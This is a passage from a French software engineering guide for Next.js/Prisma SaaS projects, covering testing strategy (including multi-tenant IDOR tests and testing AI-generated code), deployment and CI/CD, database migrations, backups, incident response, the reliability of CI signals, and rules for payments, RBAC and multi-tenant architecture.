- **« Detectee, actuellement non indexee »** sur une page neuve et saine (200, `index`, canonical
  correct, dans le sitemap) n'appelle aucune modification de code : demander l'indexation et attendre
- **Un nouveau contenu met des semaines a se stabiliser** : fixer la date du prochain point de mesure
  et ne pas reagir aux variations hebdomadaires. Produire plus de contenu n'est pas la reponse a un
  contenu qui est en train de decoller

---

## 17. Tests & Qualite

### 17.1 Strategie de Tests (Pyramide)

```
        /  E2E  \          → 10% — Parcours critiques (inscription, paiement)
       / Integration \      → 30% — API routes, Server Actions, services avec DB
      /    Unitaires    \   → 60% — Fonctions pures, utils, validations, hooks
```

| Type        | Outil recommande          | Quand                                      |
| ----------- | ------------------------- | ------------------------------------------ |
| Unitaire    | Vitest / Jest             | Fonctions pures, utils, hooks, schemas Zod |
| Integration | Vitest + Prisma (test DB) | Services, Server Actions, API Routes       |
| E2E         | Playwright / Cypress      | Parcours utilisateur complets              |
| Visuel      | Storybook + Chromatic     | Composants UI, design system               |

### 17.2 Checklist Pre-PR

```bash
npx tsc --noEmit      # Verification des types
npm run lint           # Linting
npm run build          # Build production (OBLIGATOIRE si modification de fichiers infra)
npm test               # Tests unitaires/integration
```

**Fichiers infra critiques** (tout changement exige un `npm run build` + test manuel en mode prod avant merge) :

- `prisma.ts` / client ORM / tenant guard
- `middleware.ts` / `proxy.ts` / auth config
- `next.config.js` / variables d'environnement
- Services singleton (initialises une seule fois en memoire)

### 17.3 Tests Specifiques a Ecrire

- **Precision financiere** : 100 operations de 0.10 doivent donner exactement 10.00
- **Flux d'inscription/essai** : creation compte → onboarding → dashboard → expiration → blocage
- **Limites d'import** : tester chaque limite (taille, nombre, longueur)
- **RBAC** : chaque role ne peut faire que ce qui est autorise. Chaque route API avec POST/PUT/DELETE DOIT verifier `canWrite()` ou `isAdmin()` avant toute operation d'ecriture. Ne jamais presumer qu'une route est protegee par l'UI seule
- **Multi-tenant** : un tenant ne peut JAMAIS voir les donnees d'un autre — en lecture **et** en ecriture
- **Validation** : chaque schema de validation teste avec des donnees valides ET invalides
- **Edge cases** : caracteres speciaux, unicode, chaines vides, valeurs null/undefined
- **Tests d'invariant de structure** : plutot qu'un test par ecran, un test qui parcourt **tout**
  l'ensemble (toutes les routes ont une aide, toutes les actions d'ecriture appellent le controle de
  role, tous les modeles multi-tenant sont dans la liste du garde-fou, tous les liens internes
  existent). Il attrape le cas que personne n'a pense a tester : le prochain
- **Dates** : fuseau horaire fixe dans les tests (`TZ=UTC` ou celui de la prod), et cas aux bords
  (minuit, changement d'heure, 29 fevrier, cloture d'exercice au 31/12)

### 17.4 Tests de Securite

- Injection SQL / NoSQL
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- Path traversal sur les uploads
- Rate limiting effectif
- **IDOR (Insecure Direct Object Reference)** : un user ne peut pas acceder aux ressources d'un autre tenant
- **Broken authentication** : tokens expires, sessions invalidees

### 17.5 Coverage & Qualite

- **Objectif minimum** : 80% de couverture sur les services et actions
- **Ne pas viser 100%** : ca mene a des tests fragiles qui testent l'implementation plutot que le comportement
- **Tester le comportement, pas l'implementation** : les tests doivent survivre a un refactoring
- **La couverture mesure ce qui a ete execute, pas ce qui a ete verifie** : 556 tests verts
  coexistaient avec une dependance qui levait sur tout appel reel — aucun test ne traversait ce
  chemin. Un test doit pouvoir echouer : le voir rouge au moins une fois (voir 20.1)
- **Un mock qui reproduit l'implementation ne teste rien** : moquer les frontieres (reseau, horloge),
  pas le module qu'on teste

### 17.6 Tests d'Accessibilite Automatises

```bash
# En CI/CD
npx @axe-core/cli http://localhost:3000 --exit  # Audit automatise
npx pa11y http://localhost:3000                 # Audit de page
# Ou dans les tests E2E : @axe-core/playwright sur chaque page des parcours critiques
```

- **Les outils automatiques detectent environ un tiers des problemes** d'accessibilite. Ils ne
  remplacent pas un passage au clavier seul et un test au lecteur d'ecran (NVDA, VoiceOver) sur les
  parcours critiques

```typescript
// Dans les tests
import { axe, toHaveNoViolations } from 'jest-axe'
expect.extend(toHaveNoViolations)

it('should have no a11y violations', async () => {
  const { container } = render(<MyComponent />)
  const results = await axe(container)
  expect(results).toHaveNoViolations()
})
```

### 17.7 Tester du code genere par IA — l'invariant d'abord

> **Le contexte a change : on ne tape plus les lignes, on les supervise.** Un assistant IA
> produit du code correct en surface tres vite, mais optimise pour « ca compile / ca s'affiche ».
> Les tests ne sont plus optionnels : ils sont le **filet de relecture** qui remplace la revue
> ligne-a-ligne qu'on ne fait plus. Sans eux, on deploie du code qu'on ne comprend pas
> intimement (syndrome de la boite noire).

**Les 4 pieges specifiques du code assiste par IA, et le test qui les attrape :**

| Piege                                    | Symptome                                                                   | Le test qui l'attrape                                                                               |
| ---------------------------------------- | -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| **« Ca marche donc c'est bon »**         | Fallback invisible, gestion d'erreur court-circuitee pour afficher l'ecran | Test des cas d'erreur ET des cas limites (null, 0, negatif, chaine vide), pas que du chemin heureux |
| **Vibes coding sans garde-fou**          | Logique metier melangee, effets de bord non voulus                         | Extraire la logique metier en **fonctions pures** et la tester en isolation                         |
| **Boite noire (perte de contexte)**      | Personne ne tient le modele mental complet                                 | Le test EST la specification executable : il documente le comportement attendu                      |
| **L'agent ne relit pas tout le fichier** | Une modif chirurgicale casse un invariant 800 lignes plus loin             | Suite de tests lancee a chaque changement (CI) : la regression est signalee tout de suite           |

**Strategie a ROI maximal (a appliquer en premier) — la logique metier PURE :**

- Extraire les calculs critiques (montants, soldes, projections, seuils, regles metier) dans des
  modules **purs** : aucune I/O, aucune dependance UI ou DB, entrees -> sorties deterministes.
- Ces fonctions se testent **sans base, sans mock, en millisecondes**. C'est 80 % de la valeur
  pour 20 % de l'effort. On commence toujours par la.
- Passer une **date/horloge en parametre** (`now?: Date`) plutot que d'appeler `new Date()` en
  interne -> tests deterministes, pas de flakiness lie au temps.

**Regle d'or vecue : tester le COMPORTEMENT REEL, jamais l'intention du commentaire.**

- Un commentaire genere par IA decrit souvent ce que le code _devrait_ faire, pas ce qu'il fait.
- **Exemple reel** : un moteur de projection de tresorerie portait le commentaire « ordre
  conservateur : on ne masque pas un decouvert transitoire qu'une rentree du meme jour
  compenserait ». En ecrivant le test, on a decouvert que le code verifie la negativite
  **apres** avoir applique TOUS les evenements du jour -> l'addition etant commutative, le tri
  ne change rien et le creux transitoire N'EST PAS detecte. Le test a revele l'ecart entre
  l'intention affichee et le comportement reel.
- **Consequence** : quand un test « echoue » contre ce que dit le commentaire, ne pas forcer le
  test a passer — determiner qui a raison (le code ou le commentaire) et corriger le bon des deux.
  Un test qu'on plie pour qu'il passe est pire que pas de test.

**Ce qui exige plus qu'un test unitaire pur (a ne pas oublier) :**

- **Isolation multi-tenant / IDOR** (voir [1.0](#10-securite-par-defaut-shift-left)) : ne se prouve
  qu'avec une **base de test** (un tenant ne doit JAMAIS lire les donnees d'un autre). C'est un
  test d'integration, pas un test pur — il vit a part et doit exister avant toute mise a l'echelle.
- Les mutations serveur et les requetes reelles : test d'integration sur une DB de test jetable
  (branche de base ephemere, conteneur, ou base en memoire).

### 17.8 Definition of Done — critere « teste »

Ajouter a la Definition of Done ([section 0](#0-barre-de-qualite-par-feature-definition-of-done))
pour toute feature a logique metier non triviale :

- [ ] La logique de calcul/decision est extraite en fonction pure et couverte par des tests
      (cas nominal + cas limites + cas d'erreur).
- [ ] Les invariants critiques (precision financiere, isolation tenant, seuils metier) ont un test
      dedie qui echouerait si l'invariant etait casse.
- [ ] Les tests documentent le comportement REEL verifie, pas l'intention supposee du code.

### 17.9 Prouver l'isolation multi-tenant & la logique de securite (base de test ephemere)

> L'anti-IDOR ([1.0](#10-securite-par-defaut-shift-left)) et l'anti-brute-force ne se prouvent PAS
> en test unitaire pur : ils vivent dans des clauses `WHERE` et des compteurs en base. Il faut un
> test d'**integration** qui exerce le vrai code contre une **vraie base**. Patron eprouve :

- **Base de test jetable, JAMAIS la prod/dev** : brancher les tests sur une base ephemere (branche
  de base de donnees serverless, conteneur, ou base en memoire) via une variable dediee
  (`TEST_DATABASE_URL`). Si elle est absente, la suite se **skip** proprement — jamais de repli
  silencieux sur la vraie base (un test qui ecrit/supprime sur les donnees reelles est un incident).
- **Mocker la frontiere de session, pas la base** : remplacer la couche qui lit la session/cookie
  (`verifySession` -> `userId` pilotable) et les redirections du framework ; laisser le vrai
  data-layer et les vraies requetes s'executer. C'est la requete reelle qu'on veut prouver.
- **Semer deux tenants A et B**, puis, « en tant que A », tenter d'atteindre les ressources de B.
  Chaque mutation doit affecter **0 ligne** (verifie en relisant la ressource de B, intacte).
- **Couvrir les surfaces IDOR subtiles**, pas seulement update/delete direct :
  - **propriete du parent** : ajouter un enfant (commentaire, ligne, piece) sous un parent d'autrui ;
  - **verrou de type/etat** : une action specialisee ne doit pas muter une entite d'un autre type
    via un POST forge (ex. transformer une depense en virement) ;
  - **injection de cle etrangere** : creer en referencant l'`id` d'une ressource d'autrui.
- **Un controle NEGATIF** : verifier que le tenant PEUT agir sur ses propres donnees — sinon un test
  « tout est refuse » passerait meme si le filtre etait casse en trop restrictif.
- **Logique de securite a compteurs** (anti-brute-force login, verrou PIN, invalidation de session,
  garde open-redirect) : la tester aussi en integration — message generique anti-enumeration,
  seuil de verrouillage, remise a zero au succes, `next` externe ignore.

> **Piege operationnel** : les garde-fous d'agent/CI bloquent souvent une migration (`migrate deploy`,
> `db push`) quand ils ne peuvent pas prouver que la cible est bien la base ephemere et non la prod.
> C'est sain. Preparer la base de test par un canal explicite et verifiable, pas par une commande
> qui pointe une URL ambigue.

---

## 18. Deploiement & DevOps

### 18.1 Configuration Vercel (ou equivalent)

```json
{
  "buildCommand": "prisma generate && next build",
  "framework": "nextjs",
  "regions": ["cdg1"]
}
```

- **Routes longues (export, PDF, backup)** : exporter `maxDuration` pour eviter les timeouts serverless (defaut Vercel : 10s free, 60s pro)

```typescript
// Exemple : route de generation PDF
export const maxDuration = 30 // secondes
export const dynamic = 'force-dynamic'

export async function POST(req: Request) {
  // ... generation PDF lourde
}
```

- **Piege vecu** : sans `maxDuration`, les routes de generation PDF/export CSV timeout silencieusement a 10s en free tier Vercel

### 18.2 Budget & FinOps

- Definir un budget mensuel cap (ex: 80 EUR)
- Alerter a 80% du budget
- Mode survie automatique si depassement
- Purger regulierement les tables de logs (TTL 90 jours recommande)
- Monitorer la consommation Redis (commands/jour)
- Monitorer la taille des tables DB volumineuses (audit, feedback, analytics)

### 18.3 Checklist Stripe/Paiement

- [ ] Cle publishable live configuree
- [ ] IDs de prix live configures
- [ ] Cle secrete live configuree
- [ ] Endpoint webhook cree avec secret
- [ ] Events webhook : `checkout.session.completed`, `subscription.updated`, `subscription.deleted`, `invoice.payment_failed`, `subscription.trial_will_end`
- [ ] Portail client : logo, couleurs, textes, descripteur de releve
- [ ] Mode test utilise en dev/staging (jamais de vraies cartes)
- [ ] Signature des webhooks verifiee, traitement idempotent (voir [1.17](#117-webhooks-entrants))
- [ ] Inventaire des endpoints webhook : aucun endpoint de **test** qui vise la prod, aucun endpoint mort
- [ ] Prix affiches == prix chez le prestataire, verifie automatiquement (voir 16.11)
- [ ] Parcours de paiement teste de bout en bout : paiement → webhook `2xx` → donnees a jour → rejeu du meme evenement sans doublon

### 18.4 Workflow de Migration DB

1. Backup local
2. Migration avec nom descriptif
3. **STOP sur Data Loss Warning** → script manuel
4. Verification visuelle post-migration
5. Verifier que la structure ne genere pas de requetes Redis excessives
6. Verifier les secrets en production post-migration
7. Tester les flux impactes

> **DANGER Prisma** : `prisma migrate dev` propose un **reset complet**
> de la DB si un drift est detecte (colonnes ajoutees hors migrations).
> **Ne jamais accepter en production.** Utiliser a la place :
>
> ```bash
> # 1. Creer le fichier migration.sql manuellement
> # 2. Executer le SQL : npx prisma db execute --file <path>
> # 3. Marquer comme appliquee : npx prisma migrate resolve --applied <name>
> # 4. Regenerer le client : npx prisma generate
> ```

**Merge ≠ migration.** Sur la plupart des plateformes, fusionner deploie le code mais **n'applique
pas** les migrations de production (ou les applique dans une etape separee). Pendant cet intervalle,
le nouveau code tourne sur l'ancien schema.

- **Annoncer AVANT le merge** qu'une PR contient une migration, et qui l'applique, quand
- **Expand / contract** : toute modification de schema se fait en deux temps compatibles
  1. _Expand_ — ajouter (colonne nullable, nouvelle table, nouvel index en `CONCURRENTLY`) ; l'ancien
     **et** le nouveau code fonctionnent
  2. Deployer le code qui utilise la nouvelle structure, migrer les donnees
  3. _Contract_ — retirer l'ancienne structure dans une PR ulterieure
- **Jamais de renommage ou de suppression de colonne dans la meme PR que le code qui cesse de
  l'utiliser** : le rollback du code devient impossible
- **Les migrations passent par une connexion directe**, pas par le pooler de connexions (PgBouncer en
  mode transaction refuse ou casse les migrations) — d'ou deux URL distinctes (`DATABASE_URL` poolee,
  `DIRECT_URL` directe)

### 18.5 CI/CD Pipeline

```yaml
# Pipeline type (GitHub Actions, GitLab CI, etc.)
name: CI
on: [push, pull_request]

permissions:
  contents: read

jobs:
  quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha> # epingle par SHA (voir 1.10.5)
      - run: npm ci
      - run: npx tsc --noEmit # Types
      - run: npm run lint # Lint (verifier qu'il lint vraiment quelque chose, voir 20.1)
      - run: npm audit --audit-level=high --omit=dev # Security (sortie JSON parsee en vrai gate)
      - run: npm audit signatures # Provenance
      - run: npm test # Tests
      - run: npm run build # Build

  # Deploiement automatique sur main
  deploy:
    needs: quality
    if: github.ref == 'refs/heads/main'
    steps:
      - run: npx prisma migrate deploy # Migrations prod
      # ... deploy
```

- **Un run annule n'est pas un run vert.** Avec `concurrency: cancel-in-progress`, un second push
  annule le run en cours : rien n'a ete execute. Verifier les steps du run **sur le SHA de tete** de
  la PR avant de fusionner
- **Un check ne compte que s'il est requis** dans la protection de branche ; un check simplement
  affiche se fusionne rouge
- **Smoke test post-deploiement** : quelques requetes reelles sur la prod (page d'accueil `200`, route
  publique `200` en anonyme, health check `200`, route protegee `401/307` en anonyme)

### 18.6 Environnements

| Environnement  | Usage          | Donnees                  | URL                     |
| -------------- | -------------- | ------------------------ | ----------------------- |
| **local**      | Developpement  | Seed / mock              | localhost:3000          |
| **preview**    | Review de PR   | Seed                     | auto-generee par Vercel |
| **staging**    | Pre-production | Copie anonymisee de prod | staging.monapp.com      |
| **production** | Live           | Reelles                  | monapp.com              |

- **Jamais** de vraies donnees en local/preview/staging
- **Meme infrastructure** staging = production (memes services, memes versions)
- **Une base par environnement, et la prod hors d'atteinte du poste de dev** : avec les branches de
  base de donnees (Neon, PlanetScale, Supabase...), creer une branche de dev **schema seul** coute
  quelques secondes. **Piege vecu** : le `.env` local pointait la prod — lancer l'app en local
  ecrivait en production, y compris dans des compteurs d'usage. Regles :
  - L'environnement local lit un fichier qui pointe la base de dev
  - Les commandes de migration passent par un wrapper qui **refuse** l'URL de prod
  - Une commande affiche la base ciblee avant toute operation
  - Les services annexes (cache, rate limiting, emails) sont coupes ou isoles en dev
- **Verifier le projet/compte cible avant toute operation d'infrastructure** (console cloud, CLI,
  connecteur d'agent) : un outil connecte au mauvais projet execute la bonne commande au mauvais endroit
- **Preview** : base de preview dediee (schema seul) et `X-Robots-Tag: noindex` sur tous les domaines
  de preview (voir 16.5)

### 18.7 Backup & Recovery

- **DB** : backups automatiques quotidiens (Neon/Supabase les font nativement)
- **Fichiers/uploads** : replication cross-region ou backup quotidien
- **Point-in-time recovery** : verifier que le provider DB le supporte
- **Tester la restoration** : au moins 1 fois par trimestre
- **RTO (Recovery Time Objective)** : definir le temps max acceptable de downtime
- **RPO (Recovery Point Objective)** : definir la perte de donnees max acceptable
- **Un backup jamais restaure n'est pas un backup** : la restauration de test se fait reellement, sur
  une branche/instance separee, et se chronometre (c'est votre RTO reel)
- **Le PITR du fournisseur ne couvre pas tout** : suppression du projet, compte compromis, erreur sur
  la mauvaise base. Garder un export logique periodique **hors du fournisseur**, chiffre
- **Le job de backup alerte s'il ne tourne pas** (voir 15.4)

---

## 19. Incident Response

### 19.1 Severite des Incidents

| Niveau   | Description               | Temps de reponse | Exemples                           |
| -------- | ------------------------- | ---------------- | ---------------------------------- |
| **SEV1** | Service indisponible      | < 15 min         | Site down, DB inaccessible, breach |
| **SEV2** | Feature majeure cassee    | < 1h             | Paiements casses, auth cassee      |
| **SEV3** | Feature secondaire cassee | < 4h             | Export PDF casse, UI bug visible   |
| **SEV4** | Bug mineur                | Prochain sprint  | Typo, alignement, edge case rare   |

### 19.2 Procedure de Reponse

```
1. DETECTER
   → Alerting automatique (Sentry, UptimeRobot)
   → Rapport utilisateur

2. TRIER
   → Determiner la severite (SEV1-4)
   → Assigner un responsable

3. CONTENIR
   → Rollback si possible (Vercel instant rollback)
   → Feature flag OFF si le probleme est isole
   → Page de maintenance si SEV1

4. CORRIGER
   → Hotfix sur branche dediee
   → Tests de non-regression
   → Deploy

5. POST-MORTEM
   → Documenter : timeline, cause racine, impact, actions correctives
   → Mettre a jour ce document si nouvelle regle decouverte
   → Partager avec l'equipe
```

### 19.3 Rollback

- **Vercel** : rollback instantane via le dashboard (redeployer un commit precedent)
- **DB** : point-in-time recovery si migration destructive
- **Feature flags** : desactiver la feature problematique sans rollback complet
- **Procedure** : toujours tester le rollback en staging avant de le faire en prod

### 19.4 Page de Maintenance

```typescript
// middleware.ts — activer en cas de SEV1
if (process.env.MAINTENANCE_MODE === 'true') {
  // Autoriser uniquement les admins et le health check
  if (!isAdmin(req) && !req.url.includes('/api/health')) {
    return NextResponse.rewrite(new URL('/maintenance', req.url))
  }
}
```

### 19.5 Communication de Crise

- **Page de statut** : statuspage.io ou betteruptime.com (gratuit pour les petits projets)
- **Template de communication** :
  - "Nous rencontrons actuellement un probleme avec [feature]. Nos equipes travaillent a la resolution."
  - "Le probleme a ete identifie et un correctif est en cours de deploiement."
  - "Le service est retabli. Nous vous presentons nos excuses pour la gene occasionnee."

---

## 20. Fiabilite des Signaux de Controle

> Cette section vient d'une journee ou **quatre bugs distincts avaient la meme forme** : un voyant
> vert qui ne mesurait pas ce qu'il semblait mesurer. `npm audit` vert **parce qu'**un `overrides`
> masquait le probleme en cassant le code ; 556 tests et un build verts alors qu'une dependance
> levait sur tout appel reel ; une CI verte alors que le job de lint **n'existait plus** ; deux
> `@ts-ignore` qui ne supprimaient rien.
>
> **Un voyant vert ne prouve que ce qu'il traverse.** Un outil de qualite qui ment est pire que pas
> d'outil : il transfere la confiance sans la meriter.

### 20.1 Un controle absent est indistinguable d'un controle reussi

- Avant de conclure « c'est vert », verifier que l'etape a **reellement tourne** — pas que le job a
  un code de sortie 0

```bash
# Lister les steps effectivement executes, par nom
gh run view <run-id> --json jobs \
  --jq '.jobs[] | {name, steps: [.steps[] | {name, conclusion}]}'
```

- **Piege vecu** : apres une montee de version majeure du framework, la commande de lint ne
  s'executait plus. Le job est reste mort des dizaines de pushes sans que rien ne le signale — un
  step supprime ne produit aucune sortie a lire
- **Corollaire** : tout ajout d'un gate en CI s'accompagne d'un **test negatif** — casser volontairement
  le code une fois, verifier que le job rougit. Un gate jamais vu rouge n'est pas un gate demontre
- Un run **annule** (concurrence) n'a rien execute (voir 18.5)

### 20.2 Verifier l'invariant, pas l'agregat

- Un code de sortie ne dit rien de ce qui **n'a pas ete exerce**. Une suite de tests verte prouve
  que les chemins couverts passent, pas que la dependance fonctionne
- **Ce qui tranche a chaque fois : rejouer le comportement reel.** Resoudre le module depuis l'arbre
  reellement installe et l'appeler avec la surface d'API exacte qu'un consommateur utilise

```js
// Ne pas lire un numero de version dans le lockfile — appeler ce qui est installe
const mod = require(require.resolve('la-dependance', { paths: [process.cwd()] }))
console.log(mod.laFonction('le/cas/{qui,casse}')) // le cas exact de l'advisory
```

- Meme principe pour l'UI (mesurer le rendu, 3.16), les PDF (regenerer et regarder, 11.9), les
  routes publiques (requete anonyme reelle, 9.1), le rate limiting (rafale reelle, 1.5)

### 20.3 Ne jamais rendre un signal vert en cassant ce qu'il surveille

- Un `overrides`, un `resolutions`, une exclusion de scope : chacun peut faire disparaitre l'alerte
  **en cassant** le composant qu'elle protegeait
- Si aucune version saine n'existe : **documenter l'ecart, date et motive**, dans un fichier
  d'exceptions versionne — jamais le faire disparaitre (voir 1.10.6)
- Toute reduction de perimetre d'un audit a une **contrepartie cablee** : un controle qui verifie
  que la reduction reste legitime, et qui signale l'exception devenue inutile

### 20.4 Ni job rouge permanent, ni `|| true`

- Les deux reviennent exactement au meme : ne pas avoir de controle. Un job rouge en permanence n'est
  plus lu au bout de trois jours ; `continue-on-error` sur un gate de qualite est un `|| true` deguise
- **Un gate ne se cable qu'une fois la dette resorbee.** Sequence correcte : mesurer → resorber a
  zero → rendre bloquant

### 20.5 Toute suppression doit echouer quand elle devient inutile

| A proscrire                      | A utiliser                                     | Pourquoi                                                      |
| -------------------------------- | ---------------------------------------------- | ------------------------------------------------------------- |
| `@ts-ignore`                     | `@ts-expect-error`                             | Le second **echoue** s'il n'y a plus rien a supprimer         |
| `eslint-disable` en tete de fic. | `eslint-disable-next-line` sur la ligne exacte | Un disable large masque les erreurs futures du fichier entier |
| Disable sans commentaire         | Disable + **la raison**                        | Sans motif, personne n'osera jamais le retirer                |

- Activer `reportUnusedDisableDirectives` (ESLint) pour que les directives devenues inutiles echouent
- **Piege vecu** : deux `@ts-ignore` ne supprimaient plus rien, et un `eslint-disable` pointait la
  mauvaise ligne depuis sa creation. Aucun des trois n'a jamais ete signale

### 20.6 Diagnostiquer depuis la source, jamais depuis un extrait

- **Parser la sortie machine** (`npm audit --json`, `gh run view --json`), pas la fin du log. Un resume
  tronque a fait rater des vulnerabilites `critical` sur le paquet d'authentification
- **Verifier les horodatages avant de croire des logs colles** : ils peuvent etre anterieurs au
  correctif. `gh run list` d'abord, comparer les dates, diagnostiquer ensuite
- Ne jamais diagnostiquer sur la foi d'un extrait fourni par un tiers — humain ou agent

### 20.7 Reecriture en masse : passer par l'AST, jamais par `sed`

- Une substitution textuelle ne distingue pas le **contenu** du **code qui le produit**
- **Piege vecu** : le module d'emails contenait la fonction d'echappement HTML (`.replace(/'/g, '&#39;')`).
  Une substitution textuelle de `&#39;` l'aurait cassee silencieusement, en remplacant la cible de
  l'echappement par le caractere echappe
- **Regle** : ne reecrire que les noeuds identifies par le compilateur (`JsxText`, `StringLiteral`),
  via l'API TypeScript, `jscodeshift` ou `ts-morph` — et relire le diff

### 20.8 Avant de « corriger », verifier qu'il y a quelque chose a corriger

- Une part importante du temps d'audit se depense a reparer des choses qui fonctionnaient
- **Pieges vecus** : 17 casts `as any` gardes par un `if` qui ne protegeait rien — les modeles
  existaient ; une augmentation de types deja presente, dont 3 casts sur 4 n'avaient qu'a etre
  retires ; un `require` dans un script CommonJS parfaitement correct — c'etait la **regle** de lint
  qu'il fallait desactiver pour ce fichier, pas le code
- **L'inverse est aussi vrai** : un avertissement banal peut cacher une vraie faille. Un warning de lint
  sur une balise `<img>` cachait l'envoi du secret MFA a un tiers (1.18). Instruire avant de traiter
- **Regle** : reproduire le probleme avant d'ecrire le correctif. Si on n'arrive pas a le reproduire,
  la premiere hypothese a tester est qu'il n'existe pas

### 20.9 Les surfaces declaratives mentent en silence

Tout texte qui **decrit** le produit sans etre **execute** par lui derive des le premier changement :
rien ne casse, aucun test ne rougit, et l'affirmation fausse reste en ligne.

| Surface                     | Ce qui a ete vecu                                                                                                          |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Page legale                 | Hebergement « aux Etats-Unis » apres la migration de la base en UE (2.10)                                                  |
| Aide / FAQ / checklist      | Fonctions decrites qui n'existaient pas (4.1)                                                                              |
| JSON-LD                     | Offre « gratuite » contredite par la page tarifs ; `featureList` citant une fonction « par IA » retiree du produit (16.10) |
| Ecran d'expiration          | Duree de conservation promise sans job de purge (2.4)                                                                      |
| Landing, `llms.txt`, emails | Memes risques, memes causes                                                                                                |

- **Inventaire** : tenir la liste des surfaces declaratives du projet. Quand une fonctionnalite est
  ajoutee, retiree ou modifiee, la PR passe sur chacune (`grep` du nom de la fonctionnalite sur tout
  le depot, pas seulement le code)
- **Source unique** : prix, durees, limites de quotas, liste des fonctionnalites — une constante
  consommee par toutes les surfaces, plutot que du texte libre recopie
- **Test** des que c'est possible (coherence des prix, sources, aide par route) ; **relecture
  obligatoire** sinon, inscrite dans la definition de fini de toute migration d'infrastructure
- **Ne jamais affirmer une conformite** (norme, formulaire officiel, reglement) que seul un audit
  externe pourrait soutenir : nommer le referentiel, decrire ce qui est couvert, dire ce qui manque

### 20.10 Un garde-fou doit se comporter pareil en dev et en prod

- Un controle qui **avertit** en dev et **leve** en prod garantit que les violations atteignent la
  production : tests, build et CI les laissent passer
- **Piege vecu** : le garde-fou d'isolation tenant ne faisait qu'un `console.warn` en dev. Une action
  ecrivant par ID seul est passee partout, puis a renvoye une 500 en production (1.0)
- **Regle** : le garde-fou leve dans tous les environnements ; si un cas legitime le declenche, il
  passe par un chemin explicite (client admin, liste d'exceptions motivee), jamais par un mode
  permissif global
- Meme logique pour les replis « confortables » du dev (stockage disque au lieu du bucket, rate
  limiting en memoire, emails desactives) : ils doivent etre visibles, et le comportement de prod doit
  etre teste au moins une fois sur un environnement qui le reproduit (preview)

---

## 21. Domaines specifiques par archetype (SaaS / Entreprise)

> Sections **conditionnelles** : elles ne concernent pas tous les projets (voir
> [profils](#comment-utiliser-ce-guide--profils-de-projet)). N'ecrivez ces regles que si l'archetype
> les appelle — mais alors elles sont critiques. Elles completent, sans les remplacer, les regles
> transverses : webhooks ([1.17](#117-webhooks-entrants)), checklist paiement
> ([18.3](#183-checklist-stripepaiement)), isolation multi-tenant
> ([12.1](#121-isolation-multi-tenant)).

### 21.1 Paiements & abonnements (SaaS)

> A n'implementer QUE si le produit encaisse de l'argent. Un bug ici = perte financiere directe
> ou double-facturation d'un client. Les paiements ont leur propre Definition of Done.

- **Ne JAMAIS faire transiter ni stocker un numero de carte** : deleguer au prestataire (Stripe,
  Mollie, Adyen…) via ses composants hostes (Elements/Checkout hosted). Le perimetre PCI-DSS reste
  hors de votre code (SAQ-A). Ne stocker que l'`id` client/abonnement du prestataire.
- **Le webhook est la source de verite, PAS la redirection de retour** : l'utilisateur peut fermer
  l'onglet apres avoir paye. C'est l'evenement serveur-a-serveur (`checkout.session.completed`,
  `invoice.paid`…) qui active/prolonge l'acces — jamais la seule page de succes.
- **Verifier la signature du webhook** (secret d'endpoint) : sinon n'importe qui peut forger un
  « paiement reussi » en POSTant sur votre URL.
- **Idempotence des webhooks** : un evenement est recu potentiellement plusieurs fois (retries du
  prestataire). Dedupliquer par `event.id` deja traite (table d'evenements) -> jamais de
  double-credit / double-provisioning.
- **Idempotency-Key sur les appels sortants** de creation (paiement/abonnement) : un retry reseau ne
  doit pas double-facturer.
- **Cycle de vie complet a modeliser** : essai -> actif -> impaye (`past_due`) -> relance (dunning)
  -> resilie -> reactive. Definir l'etat de l'ACCES a chaque transition (grace period sur impaye
  plutot qu'une coupure brutale ; retrograder proprement a la resiliation).
- **Reconciliation** : le prestataire fait foi ; ne jamais deriver l'etat d'abonnement de votre seule
  base sans resynchronisation (des webhooks se perdent — prevoir un rattrapage periodique).
- **Tester les webhooks** (CLI du prestataire en local, evenements rejoues) fait partie de la
  Definition of Done paiement — cf. [17.9](#179-prouver-lisolation-multi-tenant--la-logique-de-securite-base-de-test-ephemere)
  pour le style de test d'integration.

### 21.2 Autorisation avancee : RBAC / SSO / audit (Entreprise, SaaS multi-utilisateurs)

> L'anti-IDOR ([1.0](#10-securite-par-defaut-shift-left)) protege « mes donnees vs les tiennes ». Des
> qu'il y a des **roles** (admin, membre, invite…), il faut une couche d'autorisation explicite EN
> PLUS. Ne l'ecrivez pas pour une app mono-utilisateur ; rendez-la obligatoire des le 2e role.

- **Modele de roles** : RBAC (roles -> permissions) suffit dans l'immense majorite des cas ; ABAC
  (regles sur attributs) seulement si les droits dependent du contexte (proprietaire, statut, montant).
  Definir les permissions par **action** (`invoice:delete`), pas par ecran.
- **Verification cote serveur, centralisee** : une fonction `can(user, action, resource)` appelee dans
  CHAQUE mutation/lecture sensible. Cacher un bouton dans l'UI n'est **jamais** une autorisation.
- **Portee organisationnelle** : les permissions s'appliquent a une org/equipe, pas globalement.
  Modeliser membre / admin d'org / super-admin, et la portee de chacun.
- **SSO d'entreprise** : OIDC par defaut, SAML pour les grands comptes ; le login local coexiste
  souvent. Mapper les groupes de l'IdP -> roles applicatifs. SCIM (provisioning/deprovisioning
  automatique) : optionnel, surtout pour les gros comptes — ne pas l'anticiper sans demande reelle.
- **Journal d'audit** (souvent contractuel en B2B) : qui a fait quoi, quand, sur quelle ressource —
  **append-only**, non modifiable, avec retention definie. Journaliser les actions sensibles : acces
  aux donnees, changements de droits, exports, suppressions, connexions.
- **Moindre privilege + separation des roles** : pour les actions critiques, celui qui approuve n'est
  pas celui qui execute.

### 21.3 Architecture multi-tenant (SaaS)

> Structurant : se decide AU DEBUT, tres couteux a changer apres. Ne concerne que les produits ou
> plusieurs organisations clientes coexistent.

- **Trois modeles, du plus simple au plus isole** :
  1. **Schema partage + colonne `tenant_id`** — defaut pragmatique. Simple, une seule migration, mais
     exige l'anti-IDOR sur CHAQUE requete (cf. [17.9](#179-prouver-lisolation-multi-tenant--la-logique-de-securite-base-de-test-ephemere)) : un `WHERE` oublie = fuite inter-clients.
  2. **Schema par tenant** — isolation plus forte, mais migrations a executer x N schemas.
  3. **Base par tenant** — isolation maximale, cout et complexite eleves ; reserve aux clients regules
     ou tres gros comptes.
- **Ne jamais deduire le tenant du client** : toujours depuis la session/token cote serveur.
- **Provisioning atomique d'un tenant** : creation org + owner + donnees par defaut en une transaction ;
